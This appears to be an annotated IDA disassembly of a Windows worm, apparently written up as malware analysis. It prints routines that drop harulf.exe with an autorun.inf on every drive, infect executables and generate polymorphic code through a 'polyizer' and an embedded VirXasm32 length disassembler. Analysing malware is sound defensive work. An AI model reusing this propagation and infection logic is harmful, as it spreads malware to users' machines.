.text:00402279 FF 95 2B 17 40 00                          call    ss:AddrGetLogicaldrive[ebp] ; call GetLogicalDrive
.text:0040227F 33 D2                                      xor     edx, edx        ; clear
.text:00402281 8D 95 75 22 40 00                          lea     edx, root[ebp]  ; lead the addr of string "a:\"
.text:00402287 33 C9                                      xor     ecx, ecx        ; clear
.text:00402289
.text:00402289                            loc_402289:                             ; CODE XREF: payload4+24\u2193j
.text:00402289 0F A3 C8                                   bt      eax, ecx        ; checking the ecx'th bit of eax to si if it's set, to see if the respective drive is on
.text:0040228C 73 07                                      jnb     short loc_402295 ; if not, move on
.text:0040228E 60                                         pusha                   ; save
.text:0040228F E8 78 00 00 00                             call    dropAndInfect   ; otherwise, infect
.text:00402294 61                                         popa                    ; restore
.text:00402295
.text:00402295                            loc_402295:                             ; CODE XREF: payload4+13\u2191j
.text:00402295 FE 02                                      inc     byte ptr [edx]  ; increment the drive to be the next letter
.text:00402297 41                                         inc     ecx             ; check next bit of the local drive bit mask
.text:00402298 83 F9 21                                   cmp     ecx, 21h ; '!'  ; check if we are the end
.text:0040229B 77 02                                      ja      short locret_40229F ; if so, return
.text:0040229D EB EA                                      jmp     short loc_402289 ; othervise loop to infect next drive
.text:0040229F                            ; ---------------------------------------------------------------------------
.text:0040229F
.text:0040229F                            locret_40229F:                          ; CODE XREF: payload4+22\u2191j
.text:0040229F C3                                         retn
.text:0040229F                            payload4        endp
.text:0040229F
.text:0040229F                            ; ---------------------------------------------------------------------------
.text:004022A0 5B 61 75 74 6F 72 75 6E 5D+aAutorunOpenHar db '[autorun]',0Dh,0Ah  ; DATA XREF: dropAndInfect+6F\u2193o
.text:004022A0 0D 0A 6F 70 65 6E 3D 68 61+                db 'open=harulf.exe',0Dh,0Ah
.text:004022A0 72 75 6C 66 2E 65 78 65 0D+                db 'shell\open\command=harulf.exe',0Dh,0Ah
.text:004022A0 0A 73 68 65 6C 6C 5C 6F 70+                db 'shell\open\default=1',0
.text:004022F0 61 75 74 6F 72 75 6E 2E 69+aAutorunInf     db 'autorun.inf',0      ; DATA XREF: dropAndInfect+58\u2193o
.text:004022FC 5C 68 61 72 75 6C 66 2E 65+aHarulfExe      db '\harulf.exe',0      ; DATA XREF: dropAndInfect+38\u2193o
.text:00402308 00 00 00 00                currDirectoryName dd 0                  ; DATA XREF: dropAndInfect+D\u2193w
.text:00402308                                                                    ; dropAndInfect+13\u2193r ...
.text:0040230C
.text:0040230C                            ; =============== S U B R O U T I N E =======================================
.text:0040230C
.text:0040230C                            ; drop an autorun with harulf.exe on every writable drive
.text:0040230C
.text:0040230C                            dropAndInfect   proc near               ; CODE XREF: payload4+16\u2191p
.text:0040230C 68 00 01 00 00                             push    100h            ; dwBytes
.text:00402311 6A 00                                      push    0               ; uFlags
.text:00402313 FF 95 53 17 40 00                          call    ss:GlobalAlloc[ebp] ; Alloc memory for infection
.text:00402319 89 85 08 23 40 00                          mov     ss:currDirectoryName[ebp], eax ; save that buffer (pointer to mem)
.text:0040231F FF B5 08 23 40 00                          push    ss:currDirectoryName[ebp] ; buffer as arg
.text:00402325 68 00 01 00 00                             push    100h            ; buffer length
.text:0040232A FF 95 8F 17 40 00                          call    ss:GetCurrentDirectoryF[ebp] ; call GetCurrentDirectory
.text:00402330 8D B5 75 22 40 00                          lea     esi, root[ebp]  ; grab addr of "a:\" aka drive
.text:00402336 56                                         push    esi             ; pathname as esi of the current drive
.text:00402337 FF 95 93 17 40 00                          call    ss:SetCurrentDirectory[ebp] ; call setCurrentDirectory
.text:0040233D E8 18 F7 FF FF                             call    nfkt_exe        ; call to infect the exe files in the root directory of the drive
.text:00402342 6A 00                                      push    0               ; arg Fasle
.text:00402344 8D 85 FC 22 40 00                          lea     eax, aHarulfExe[ebp] ; addr of harulf.exe string
.text:0040234A 50                                         push    eax             ; harulf.exe as param to copy to the root directory
.text:0040234B FF B5 9D 23 40 00                          push    ss:FileName[ebp] ; FileName as arg
.text:00402351 FF 95 8B 17 40 00                          call    ss:CopyFileF[ebp] ; Copy harulf.exe into root directory of the drive
.text:00402357 33 C0                                      xor     eax, eax        ; clear
.text:00402359 50                                         push    eax             ; push zero template
.text:0040235A 50                                         push    eax             ; push zero flags
.text:0040235B 6A 02                                      push    2               ; creation disp = 2 (always create new)
.text:0040235D 50                                         push    eax             ; security = 0
.text:0040235E 50                                         push    eax             ; sharemode = 0
.text:0040235F 68 00 00 00 40                             push    40000000h       ; w/r permission
.text:00402364 8D 85 F0 22 40 00                          lea     eax, aAutorunInf[ebp] ; addr of autorun.inf
.text:0040236A 50                                         push    eax             ; autorun.inf filename
.text:0040236B FF 95 2F 17 40 00                          call    ss:CreateFile[ebp] ; Creates autorun.inf
.text:00402371 50                                         push    eax             ; pushes the file handle to stack
.text:00402372 6A 00                                      push    0               ; push zero
.text:00402374 8B D4                                      mov     edx, esp        ; sets edx to sp
.text:00402376 6A 00                                      push    0               ; lpOverlapped
.text:00402378 52                                         push    edx             ; lpNumberOfBytesWritten
.text:00402379 6A 50                                      push    50h ; 'P'       ; nNumberOfBytesToWrite
.text:0040237B 8D 95 A0 22 40 00                          lea     edx, aAutorunOpenHar[ebp] ; reference to harulf.exe to be written in autorun filewhich will be autoran with the autorun file
.text:00402381 52                                         push    edx             ; lpBuffer
.text:00402382 50                                         push    eax             ; hFile
.text:00402383 FF 95 37 17 40 00                          call    ss:WriteFile[ebp] ; call WriteFile to write to autorun file
.text:00402389 58                                         pop     eax             ; pop eax, file handle left on the stack
.text:0040238A FF 95 33 17 40 00                          call    ss:dword_401733[ebp] ; close file handle (close the file handle on the stack)
.text:00402390 FF B5 08 23 40 00                          push    ss:currDirectoryName[ebp] ; push up the old current directory name
.text:00402396 FF 95 93 17 40 00                          call    ss:SetCurrentDirectory[ebp] ; Set current directory back to the current directory we got in the beggining, moves away from the drive
.text:0040239C C3                                         retn
.text:0040239C                            dropAndInfect   endp
.text:0040239C
.text:0040239C                            ; ---------------------------------------------------------------------------
.text:0040239D 00 00 00 00                FileName        dd 0                    ; DATA XREF: payload3+E\u2191r
.text:0040239D                                                                    ; dropAndInfect+3F\u2191r ...
.text:004023A1
.text:004023A1                            ; =============== S U B R O U T I N E =======================================
.text:004023A1
.text:004023A1
.text:004023A1                            getName         proc near               ; CODE XREF: start+30F\u2191p
.text:004023A1 68 00 01 00 00                             push    100h            ; dwBytes
.text:004023A6 6A 00                                      push    0               ; uFlags
.text:004023A8 FF 95 53 17 40 00                          call    ss:GlobalAlloc[ebp] ; call Alloc
.text:004023AE 89 85 9D 23 40 00                          mov     ss:FileName[ebp], eax ; save pointer to the alloc mem
.text:004023B4 68 00 01 00 00                             push    100h            ; push 256
.text:004023B9 FF B5 9D 23 40 00                          push    ss:FileName[ebp] ; push the pointer as an arg (buffer)
.text:004023BF 6A 00                                      push    0               ; null, get current file name arg
.text:004023C1 FF 95 87 17 40 00                          call    ss:GetModuleFileName[ebp] ; call GetModuleFileName, sae the current file name to the buffer
.text:004023C7 8B B5 9D 23 40 00                          mov     esi, ss:FileName[ebp] ; esi = start of the file name
.text:004023CD 56                                         push    esi             ; push it as an arg
.text:004023CE E8 67 00 00 00                             call    size_string     ; get the file size
.text:004023D3 5E                                         pop     esi             ; restore
.text:004023D4 03 F1                                      add     esi, ecx        ; esi+=ecx to get to the end of the string
.text:004023D6 B9 08 00 00 00                             mov     ecx, 8          ; ecx = 8
.text:004023DB 33 C0                                      xor     eax, eax        ; clear
.text:004023DD
.text:004023DD                            loooop:                                 ; CODE XREF: getName+44\u2193j
.text:004023DD 4E                                         dec     esi             ; esi = pointer to second to last letter
.text:004023DE 66 81 3E 68 61                             cmp     word ptr [esi], 'ah' ; compare it to "ha" We are pretty uch looking for the harulf file here
.text:004023E3 74 03                                      jz      short loc_4023E8 ; if it is, jump
.text:004023E5 E2 F6                                      loop    loooop          ; loop until you find "ha"
.text:004023E7 C3                                         retn
.text:004023E8                            ; ---------------------------------------------------------------------------
.text:004023E8
.text:004023E8                            loc_4023E8:                             ; CODE XREF: getName+42\u2191j
.text:004023E8 48                                         dec     eax             ; eax = -1 if  found
.text:004023E9 C3                                         retn
.text:004023E9                            getName         endp
.text:004023E9
.text:004023E9                            ; ---------------------------------------------------------------------------
.text:004023EA 65 78 70 6C 6F 72 65 72 20+aExplorer       db 'explorer ',0        ; DATA XREF: run_explorer\u2193o
.text:004023F4
.text:004023F4                            ; =============== S U B R O U T I N E =======================================
.text:004023F4
.text:004023F4
.text:004023F4                            run_explorer    proc near               ; CODE XREF: start+318\u2191p
.text:004023F4 8D B5 EA 23 40 00                          lea     esi, aExplorer[ebp] ; load the addr of that string
.text:004023FA 8B FC                                      mov     edi, esp        ; edi = esp
.text:004023FC 81 EF 00 02 00 00                          sub     edi, 200h       ; edi -= 512 bytes
.text:00402402 57                                         push    edi             ; save that
.text:00402403 B9 09 00 00 00                             mov     ecx, 9          ; ecx = 9, size of the string explorer + 1 for null
.text:00402408 F3 A4                                      rep movsb               ; copy explorer to the [stack - 512]
.text:0040240A B9 02 00 00 00                             mov     ecx, 2          ; counter = 2
.text:0040240F 8B B5 9D 23 40 00                          mov     esi, ss:FileName[ebp] ; file name as source
.text:00402415 F3 A4                                      rep movsb               ; copy the first 2 charecters of the drive  name
.text:00402417 C6 47 01 00                                mov     byte ptr [edi+1], 0 ; add the null terminator
.text:0040241B B9 0B 00 00 00                             mov     ecx, 0Bh        ; explorer string + null terminator + 2 extra letters = size
.text:00402420 51                                         push    ecx             ; save
.text:00402421 51                                         push    ecx             ; dwBytes that size as an arg
.text:00402422 6A 00                                      push    0               ; uFlags
.text:00402424 FF 15 53 17 40 00                          call    GlobalAlloc     ; call Alloc
.text:0040242A 59                                         pop     ecx             ; resotre
.text:0040242B 5E                                         pop     esi             ; resotre
.text:0040242C 8B F8                                      mov     edi, eax        ; edi = pointer to the alloc buffer
.text:0040242E F3 A4                                      rep movsb               ; copy explorare string + the drive letter as a command to the buffer
.text:00402430 6A 05                                      push    5               ; uCmdShow (to open up a window)
.text:00402432 50                                         push    eax             ; lpCmdLine open up win explorer
.text:00402433 FF 95 9F 17 40 00                          call    ss:WinExec[ebp] ; call WinExec (will open up windows explorer at the Drive:)
.text:00402439 C3                                         retn
.text:00402439                            run_explorer    endp
.text:00402439
.text:0040243A
.text:0040243A                            ; =============== S U B R O U T I N E =======================================
.text:0040243A
.text:0040243A                            ; clear
.text:0040243A
.text:0040243A                            size_string     proc near               ; CODE XREF: nfkt_exe+4A\u2191p
.text:0040243A                                                                    ; nfkt_exe+8F\u2191p ...
.text:0040243A 33 C9                                      xor     ecx, ecx        ; clear
.text:0040243C
.text:0040243C                            loc_40243C:                             ; CODE XREF: size_string+9\u2193j
.text:0040243C 80 3E 00                                   cmp     byte ptr [esi], 0 ; check if it's 0
.text:0040243F 74 04                                      jz      short locret_402445 ; if it's 0 we found the end
.text:00402441 46                                         inc     esi             ; othervise look at the next byte
.text:00402442 41                                         inc     ecx             ; counter++
.text:00402443 EB F7                                      jmp     short loc_40243C ; loop
.text:00402445                            ; ---------------------------------------------------------------------------
.text:00402445
.text:00402445                            locret_402445:                          ; CODE XREF: size_string+5\u2191j
.text:00402445 C3                                         retn                    ; return size of string
.text:00402445                            size_string     endp
.text:00402445
.text:00402446
.text:00402446                            ; =============== S U B R O U T I N E =======================================
.text:00402446
.text:00402446
.text:00402446                            rand            proc near               ; CODE XREF: start+2FF\u2191p
.text:00402446                                                                    ; decideOnRandFunc+7\u2193p
.text:00402446 41                                         inc     ecx             ; ecx++
.text:00402447 51                                         push    ecx             ; save ecx as arg
.text:00402448 FF 95 9B 17 40 00                          call    ss:GetTickCount[ebp] ; get random seed from tick count
.text:0040244E 8B C8                                      mov     ecx, eax        ; ecx = eax retrurn value
.text:00402450 0F 31                                      rdtsc                   ; read time stamp countre (cpu ticks)
.text:00402452 33 C8                                      xor     ecx, eax        ; xor those
.text:00402454 91                                         xchg    eax, ecx        ; swap
.text:00402455 59                                         pop     ecx             ; restores ecx
.text:00402456
.text:00402456                            looopBoy:                               ; CODE XREF: rand+19\u2193j
.text:00402456                                                                    ; rand+21\u2193j
.text:00402456 51                                         push    ecx             ; save ecx
.text:00402457 33 D2                                      xor     edx, edx        ; clear
.text:00402459 F7 F1                                      div     ecx             ; edx = remainder, eax = eax/ecx
.text:0040245B 92                                         xchg    eax, edx        ; swap
.text:0040245C 59                                         pop     ecx             ; restore ecx
.text:0040245D 3B C1                                      cmp     eax, ecx        ; compare ecx and the remainder
.text:0040245F 77 F5                                      ja      short looopBoy  ; jump if the remainder is greater than ecx
.text:00402461 83 F8 00                                   cmp     eax, 0          ; is the reaminder 0?
.text:00402464 77 03                                      ja      short locret_402469 ; jump if greater than 0
.text:00402466 92                                         xchg    eax, edx        ; swap eax contians the final value
.text:00402467 EB ED                                      jmp     short looopBoy  ; loop
.text:00402469                            ; ---------------------------------------------------------------------------
.text:00402469
.text:00402469                            locret_402469:                          ; CODE XREF: rand+1E\u2191j
.text:00402469 C3                                         retn
.text:00402469                            rand            endp
.text:00402469
.text:0040246A
.text:0040246A                            ; =============== S U B R O U T I N E =======================================
.text:0040246A
.text:0040246A                            ; Attributes: noreturn
.text:0040246A
.text:0040246A                            VirXasm32       proc near               ; CODE XREF: polyizer+51\u2193p
.text:0040246A                                                                    ; .text:00402619\u2193p ...
.text:0040246A 60                                         pusha                   ; save all the registers
.text:0040246B 83 EC 6E                                   sub     esp, 6Eh        ; subtracting 110 from esp (making room for?
.text:0040246E FC                                         cld                     ; clearing the direction flag for string operations
.text:0040246F 89 E7                                      mov     edi, esp        ; save the sp to edi
.text:00402471 56                                         push    esi             ; saving esi
.text:00402472 E8 3B 00 00 00                             call    sub_4024B2      ; ebx = esi
.text:00402477 58                                         pop     eax
.text:00402478 EA 11 00 3E F3 B1 BF                       jmp     far ptr 0BFB1h:0F33E0011h
.text:00402478                            VirXasm32       endp
.text:00402478
.text:00402478                            ; ---------------------------------------------------------------------------
.text:0040247F 80                                         db 80h
.text:00402480 0B AC B0 19 54 11 0C 0A FF+                dd 19B0AC0Bh, 0A0C1154h, 0F3F3FFFFh, 555F0F88h, 550D5D55h
.text:00402480 FF F3 F3 88 0F 5F 55 55 5D+                dd 1D005FFh, 7551004h, 0F0EC40Dh, 0F8FF7FA0h, 0FFFFFFF8h
.text:00402480 0D 55 FF 05 D0 01 04 10 55+                dd 0FFFFFF55h, 100101FFh
.text:004024B0 10 15                                      db 10h, 15h
.text:004024B2
.text:004024B2                            ; =============== S U B R O U T I N E =======================================
.text:004024B2
.text:004024B2                            ; ebx = esi
.text:004024B2
.text:004024B2                            sub_4024B2      proc near               ; CODE XREF: VirXasm32+8\u2191p
.text:004024B2
.text:004024B2                            arg_76          = dword ptr  7Ah
.text:004024B2                            arg_8E          = dword ptr  92h
.text:004024B2
.text:004024B2 5B                                         pop     ebx             ; ebx = esi
.text:004024B3 8D 73 0D                                   lea     esi, [ebx+13]
.text:004024B6 6A 64                                      push    64h ; 'd'
.text:004024B8 59                                         pop     ecx
.text:004024B9
.text:004024B9                            loc_4024B9:                             ; CODE XREF: sub_4024B2+F\u2193j
.text:004024B9 0F A3 0B                                   bt      [ebx], ecx
.text:004024BC D6                                         setalc
.text:004024BD 73 01                                      jnb     short loc_4024C0
.text:004024BF AC                                         lodsb
.text:004024C0
.text:004024C0                            loc_4024C0:                             ; CODE XREF: sub_4024B2+B\u2191j
.text:004024C0 AA                                         stosb
.text:004024C1 E2 F6                                      loop    loc_4024B9
.text:004024C3 5E                                         pop     esi
.text:004024C4 6A 02                                      push    2
.text:004024C6 5B                                         pop     ebx
.text:004024C7 89 DA                                      mov     edx, ebx
.text:004024C9
.text:004024C9                            loc_4024C9:                             ; CODE XREF: sub_4024B2+59\u2193j
.text:004024C9 AC                                         lodsb
.text:004024CA 50                                         push    eax
.text:004024CB 50                                         push    eax
.text:004024CC 3C 66                                      cmp     al, 66h ; 'f'
.text:004024CE 0F 44 D9                                   cmovz   ebx, ecx
.text:004024D1 3C 67                                      cmp     al, 67h ; 'g'
.text:004024D3 0F 44 D1                                   cmovz   edx, ecx
.text:004024D6 3C EA                                      cmp     al, 0EAh ; 'ê'
.text:004024D8 74 05                                      jz      short loc_4024DF
.text:004024DA 3C 9A                                      cmp     al, 9Ah ; ''
.text:004024DC 75 05                                      jnz     short loc_4024E3
.text:004024DE 46                                         inc     esi
.text:004024DF
.text:004024DF                            loc_4024DF:                             ; CODE XREF: sub_4024B2+26\u2191j
.text:004024DF 8D 74 1E 03                                lea     esi, [esi+ebx+3]
.text:004024E3
.text:004024E3                            loc_4024E3:                             ; CODE XREF: sub_4024B2+2A\u2191j
.text:004024E3 3C C8                                      cmp     al, 0C8h ; 'È'
.text:004024E5 74 06                                      jz      short loc_4024ED
.text:004024E7 24 F7                                      and     al, 0F7h
.text:004024E9 3C C2                                      cmp     al, 0C2h ; 'Â'
.text:004024EB 75 02                                      jnz     short loc_4024EF
.text:004024ED
.text:004024ED                            loc_4024ED:                             ; CODE XREF: sub_4024B2+33\u2191j
.text:004024ED 46                                         inc     esi
.text:004024EE 46                                         inc     esi
.text:004024EF
.text:004024EF                            loc_4024EF:                             ; CODE XREF: sub_4024B2+39\u2191j
.text:004024EF 24 E7                                      and     al, 0E7h
.text:004024F1 3C 26                                      cmp     al, 26h ; '&'
.text:004024F3 58                                         pop     eax
.text:004024F4 74 14                                      jz      short loc_40250A
.text:004024F6 3C F1                                      cmp     al, 0F1h ; 'ñ'
.text:004024F8 74 0E                                      jz      short loc_402508
.text:004024FA 24 FC                                      and     al, 0FCh
.text:004024FC 3C A0                                      cmp     al, 0A0h ; ' '
.text:004024FE 75 04                                      jnz     short loc_402504
.text:00402500 8D 74 16 02                                lea     esi, [esi+edx+2]
.text:00402504
.text:00402504                            loc_402504:                             ; CODE XREF: sub_4024B2+4C\u2191j
.text:00402504 3C F0                                      cmp     al, 0F0h ; 'ð'
.text:00402506 74 02                                      jz      short loc_40250A
.text:00402508
.text:00402508                            loc_402508:                             ; CODE XREF: sub_4024B2+46\u2191j
.text:00402508 3C 64                                      cmp     al, 64h ; 'd'
.text:0040250A
.text:0040250A                            loc_40250A:                             ; CODE XREF: sub_4024B2+42\u2191j
.text:0040250A                                                                    ; sub_4024B2+54\u2191j
.text:0040250A 58                                         pop     eax
.text:0040250B 74 BC                                      jz      short loc_4024C9
.text:0040250D 89 E7                                      mov     edi, esp
.text:0040250F 52                                         push    edx
.text:00402510 50                                         push    eax
.text:00402511 3C 0F                                      cmp     al, 0Fh
.text:00402513 75 01                                      jnz     short loc_402516
.text:00402515 AC                                         lodsb
.text:00402516
.text:00402516                            loc_402516:                             ; CODE XREF: sub_4024B2+61\u2191j
.text:00402516 9C                                         pushf
.text:00402517 D4 10                                      aam     10h
.text:00402519 86 CC                                      xchg    cl, ah
.text:0040251B 98                                         cwde
.text:0040251C 99                                         cdq
.text:0040251D 31 ED                                      xor     ebp, ebp
.text:0040251F 9D                                         popf
.text:00402520 75 16                                      jnz     short loc_402538
.text:00402522 83 C7 35                                   add     edi, 35h ; '5'
.text:00402525 E3 0D                                      jecxz   short loc_402534
.text:00402527
.text:00402527                            loc_402527:                             ; CODE XREF: sub_4024B2+7C\u2193j
.text:00402527 0F A3 2F                                   bt      [edi], ebp
.text:0040252A 73 01                                      jnb     short loc_40252D
.text:0040252C 42                                         inc     edx
.text:0040252D
.text:0040252D                            loc_40252D:                             ; CODE XREF: sub_4024B2+78\u2191j
.text:0040252D 45                                         inc     ebp
.text:0040252E E2 F7                                      loop    loc_402527
.text:00402530 72 02                                      jb      short loc_402534
.text:00402532 D6                                         setalc
.text:00402533 99                                         cdq
.text:00402534
.text:00402534                            loc_402534:                             ; CODE XREF: sub_4024B2+73\u2191j
.text:00402534                                                                    ; sub_4024B2+7E\u2191j
.text:00402534 D1 E2                                      shl     edx, 1
.text:00402536 EB 18                                      jmp     short loc_402550
.text:00402538                            ; ---------------------------------------------------------------------------
.text:00402538
.text:00402538                            loc_402538:                             ; CODE XREF: sub_4024B2+6E\u2191j
.text:00402538 80 E9 04                                   sub     cl, 4
.text:0040253B 79 04                                      jns     short loc_402541
.text:0040253D B1 0C                                      mov     cl, 0Ch
.text:0040253F 24 07                                      and     al, 7
.text:00402541
.text:00402541                            loc_402541:                             ; CODE XREF: sub_4024B2+89\u2191j
.text:00402541 E3 0B                                      jecxz   short loc_40254E
.text:00402543
.text:00402543                            loc_402543:                             ; CODE XREF: sub_4024B2+98\u2193j
.text:00402543 80 D2 01                                   adc     dl, 1
.text:00402546 45                                         inc     ebp
.text:00402547 0F A3 2F                                   bt      [edi], ebp
.text:0040254A E2 F7                                      loop    loc_402543
.text:0040254C 72 02                                      jb      short loc_402550
.text:0040254E
.text:0040254E                            loc_40254E:                             ; CODE XREF: sub_4024B2:loc_402541\u2191j
.text:0040254E D0 E8                                      shr     al, 1
.text:00402550
.text:00402550                            loc_402550:                             ; CODE XREF: sub_4024B2+84\u2191j
.text:00402550                                                                    ; sub_4024B2+9A\u2191j
.text:00402550 86 C8                                      xchg    cl, al
.text:00402552 8D 14 D1                                   lea     edx, [ecx+edx*8]
.text:00402555 59                                         pop     ecx
.text:00402556 5D                                         pop     ebp
.text:00402557 0F A3 57 02                                bt      [edi+2], edx
.text:0040255B 73 3B                                      jnb     short loc_402598
.text:0040255D AC                                         lodsb
.text:0040255E D4 08                                      aam     8
.text:00402560 C0 E4 04                                   shl     ah, 4
.text:00402563 73 02                                      jnb     short loc_402567
.text:00402565 78 1F                                      js      short loc_402586
.text:00402567
.text:00402567                            loc_402567:                             ; CODE XREF: sub_4024B2+B1\u2191j
.text:00402567 9C                                         pushf
.text:00402568 85 ED                                      test    ebp, ebp
.text:0040256A 75 06                                      jnz     short loc_402572
.text:0040256C 2C 06                                      sub     al, 6
.text:0040256E 75 09                                      jnz     short loc_402579
.text:00402570 B0 05                                      mov     al, 5
.text:00402572
.text:00402572                            loc_402572:                             ; CODE XREF: sub_4024B2+B8\u2191j
.text:00402572 3C 04                                      cmp     al, 4
.text:00402574 75 03                                      jnz     short loc_402579
.text:00402576 AC                                         lodsb
.text:00402577 24 07                                      and     al, 7
.text:00402579
.text:00402579                            loc_402579:                             ; CODE XREF: sub_4024B2+BC\u2191j
.text:00402579                                                                    ; sub_4024B2+C2\u2191j
.text:00402579 9D                                         popf
.text:0040257A 72 06                                      jb      short loc_402582
.text:0040257C 78 07                                      js      short loc_402585
.text:0040257E 3C 05                                      cmp     al, 5
.text:00402580 75 04                                      jnz     short loc_402586
.text:00402582
.text:00402582                            loc_402582:                             ; CODE XREF: sub_4024B2+C8\u2191j
.text:00402582 01 EE                                      add     esi, ebp
.text:00402584 46                                         inc     esi
.text:00402585
.text:00402585                            loc_402585:                             ; CODE XREF: sub_4024B2+CA\u2191j
.text:00402585 46                                         inc     esi
.text:00402586
.text:00402586                            loc_402586:                             ; CODE XREF: sub_4024B2+B3\u2191j
.text:00402586                                                                    ; sub_4024B2+CE\u2191j
.text:00402586 F6 C4 60                                   test    ah, 60h
.text:00402589 75 0D                                      jnz     short loc_402598
.text:0040258B 91                                         xchg    eax, ecx
.text:0040258C 3C F6                                      cmp     al, 0F6h ; 'ö'
.text:0040258E 74 07                                      jz      short loc_402597
.text:00402590 3C F7                                      cmp     al, 0F7h ; '÷'
.text:00402592 75 04                                      jnz     short loc_402598
.text:00402594 01 DE                                      add     esi, ebx
.text:00402596 46                                         inc     esi
.text:00402597
.text:00402597                            loc_402597:                             ; CODE XREF: sub_4024B2+DC\u2191j
.text:00402597 46                                         inc     esi
.text:00402598
.text:00402598                            loc_402598:                             ; CODE XREF: sub_4024B2+A9\u2191j
.text:00402598                                                                    ; sub_4024B2+D7\u2191j ...
.text:00402598 D1 E2                                      shl     edx, 1
.text:0040259A 0F A3 57 13                                bt      [edi+13h], edx
.text:0040259E 73 0A                                      jnb     short loc_4025AA
.text:004025A0 42                                         inc     edx
.text:004025A1 0F A3 57 13                                bt      [edi+13h], edx
.text:004025A5 73 02                                      jnb     short loc_4025A9
.text:004025A7 11 DE                                      adc     esi, ebx
.text:004025A9
.text:004025A9                            loc_4025A9:                             ; CODE XREF: sub_4024B2+F3\u2191j
.text:004025A9 46                                         inc     esi
.text:004025AA
.text:004025AA                            loc_4025AA:                             ; CODE XREF: sub_4024B2+EC\u2191j
.text:004025AA 83 C4 6E                                   add     esp, 6Eh
.text:004025AD 2B 74 24 04                                sub     esi, [esp-76h+arg_76]
.text:004025B1 89 74 24 1C                                mov     [esp-76h+arg_8E], esi
.text:004025B5 61                                         popa
.text:004025B6 C3                                         retn
.text:004025B6                            sub_4024B2      endp ; sp-analysis failed
.text:004025B6
.text:004025B6                            ; ---------------------------------------------------------------------------
.text:004025B7 00 00 00 00                offsetLoop1     dd 0                    ; DATA XREF: polyizer\u2193w
.text:004025B7                                                                    ; .text:00402627\u2193w ...
.text:004025BB 00 00 00 00                offsetLoop2     dd 0                    ; DATA XREF: polyizer+A\u2193w
.text:004025BB                                                                    ; .text:00402636\u2193w ...
.text:004025BF
.text:004025BF                            ; =============== S U B R O U T I N E =======================================
.text:004025BF
.text:004025BF                            ; Attributes: noreturn
.text:004025BF
.text:004025BF                            polyizer        proc near               ; CODE XREF: start+2AA\u2191p
.text:004025BF C7 85 B7 25 40 00 00 00 00+                mov     ss:offsetLoop1[ebp], 0 ; save 0
.text:004025BF 00
.text:004025C9 C7 85 BB 25 40 00 00 00 00+                mov     ss:offsetLoop2[ebp], 0 ; save 0
.text:004025C9 00
.text:004025D3 8D B5 C7 18 40 00                          lea     esi, egg[ebp]   ; esi = addr of that acts as destination for the function to be generated
.text:004025D9 B9 20 01 00 00                             mov     ecx, 120h       ; ecx = 120
.text:004025DE 56                                         push    esi             ; save esi (addr of egg)
.text:004025DF
.text:004025DF                            zeroOutEgg:                             ; CODE XREF: polyizer+25\u2193j
.text:004025DF 33 D2                                      xor     edx, edx        ; clear
.text:004025E1 89 16                                      mov     [esi], edx      ; save edx to egg[0]
.text:004025E3 46                                         inc     esi             ; esi ++
.text:004025E4 E2 F9                                      loop    zeroOutEgg      ; zeros out the entire egg!!!!! (120h bytes)
.text:004025E6 5F                                         pop     edi             ; edi = beggining of egg
.text:004025E7 8D 85 81 26 40 00                          lea     eax, weirdOffset[ebp] ; addr of offsets
.text:004025ED B9 02 00 00 00                             mov     ecx, 2          ; ecx = 2
.text:004025F2 33 C9                                      xor     ecx, ecx        ; clear
.text:004025F4 B9 09 00 00 00                             mov     ecx, 9          ; ecx = 9 (remianing instruction set to copy) each of the random functions it's attempting to write to egg have 2 * 9 instructions
.text:004025F9
.text:004025F9                            loc_4025F9:                             ; CODE XREF: .text:00402642\u2193j
.text:004025F9 51                                         push    ecx             ; save 9 as arg
.text:004025FA E8 8E 00 00 00                             call    decideOnRandFunc ; calls decde -> edx = poly1 + randomly chosen offset
.text:004025FF 8B F2                                      mov     esi, edx        ; esi = edx (addr of random function to be written)
.text:00402601 BB 09 00 00 00                             mov     ebx, 9          ; ebx = 9
.text:00402606 2B D9                                      sub     ebx, ecx        ; ebx = ebx - ecx = index of the instruction set to be copied next
.text:00402608 87 CB                                      xchg    ecx, ebx        ; ecx = index
.text:0040260A E8 54 00 00 00                             call    seek_order      ; call to step over certain num of instructions (ecx*2) the number that has already been copied
.text:0040260F 56                                         push    esi             ; save esi -> points to polyizer
.text:00402610 E8 55 FE FF FF                             call    VirXasm32       ; call VirXasm32, gets length of the instruction into eax
.text:00402610                            polyizer        endp
.text:00402610
.text:00402615                            ; ---------------------------------------------------------------------------
.text:00402615 8B D8                                      mov     ebx, eax        ; ebx = eax the length of the instr
.text:00402617 03 F0                                      add     esi, eax        ; esi += length so that it points tot he next instuction
.text:00402619 E8 4C FE FF FF                             call    VirXasm32       ; ge tthe length of that other instruction
.text:0040261E                            ; ---------------------------------------------------------------------------
.text:0040261E 03 D8                                      add     ebx, eax        ; eax will have the length of the instr so ebx = length of the 2 instructions combined (the instruction set)
.text:00402620 83 7C 24 04 05                             cmp     dword ptr [esp+4], 5 ; check if there are less than 5 instruction sets left to copy
.text:00402625 72 08                                      jb      short loc_40262F ; if so then jump
.text:00402627 01 9D B7 25 40 00                          add     ss:offsetLoop1[ebp], ebx ; add the legth of the instr set tot hat addr
.text:0040262D EB 0D                                      jmp     short loc_40263C ; jump if more than 5 remaining
.text:0040262F                            ; ---------------------------------------------------------------------------
.text:0040262F
.text:0040262F                            loc_40262F:                             ; CODE XREF: .text:00402625\u2191j
.text:0040262F 83 7C 24 04 03                             cmp     dword ptr [esp+4], 3 ; check if there are less than 3 instruction sets left to copy
.text:00402634 72 06                                      jb      short loc_40263C ; if so, jump
.text:00402636 01 9D BB 25 40 00                          add     ss:offsetLoop2[ebp], ebx ; add the legth of the instr set tot hat addr
.text:0040263C
.text:0040263C                            loc_40263C:                             ; CODE XREF: .text:0040262D\u2191j
.text:0040263C                                                                    ; .text:00402634\u2191j
.text:0040263C 87 CB                                      xchg    ecx, ebx        ; ecx = length of the 2 instructions
.text:0040263E 5E                                         pop     esi             ; restore esi as pointer to instructions to be copied
.text:0040263F F3 A4                                      rep movsb               ; copy over
.text:00402641 59                                         pop     ecx             ; restore ecx
.text:00402642 E2 B5                                      loop    loc_4025F9      ; loop if ecx not zero aka more instructions to copy
.text:00402644 8D 85 C7 18 40 00                          lea     eax, egg[ebp]   ; grab addr to the copied function
.text:0040264A 03 85 B7 25 40 00                          add     eax, ss:offsetLoop1[ebp] ; this adds offset to the first loop in the knewly generated function
.text:00402650 03 85 BB 25 40 00                          add     eax, ss:offsetLoop2[ebp] ; this adds the length of the loop
.text:00402656 40                                         inc     eax             ; eax++ to point to right below loop
